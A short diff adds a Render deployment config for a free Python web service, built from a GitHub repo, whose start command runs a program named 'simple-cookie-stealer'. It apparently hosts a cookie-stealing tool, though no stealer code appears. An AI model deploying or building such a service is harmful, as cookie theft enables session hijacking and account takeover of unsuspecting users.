@@ -1,0 +1,11 @@
+# Exported from Render on 2024-04-24T16:40:29Z
+services:
+- type: web
+  name: nbhkb-9
+  runtime: python
+  repo: https://github.com/HUUJN/nbhkb
+  plan: free
+  region: oregon
+  buildCommand: pip install -r requirements.txt
+  startCommand: ~/simple-cookie-stealer
+version: "1"
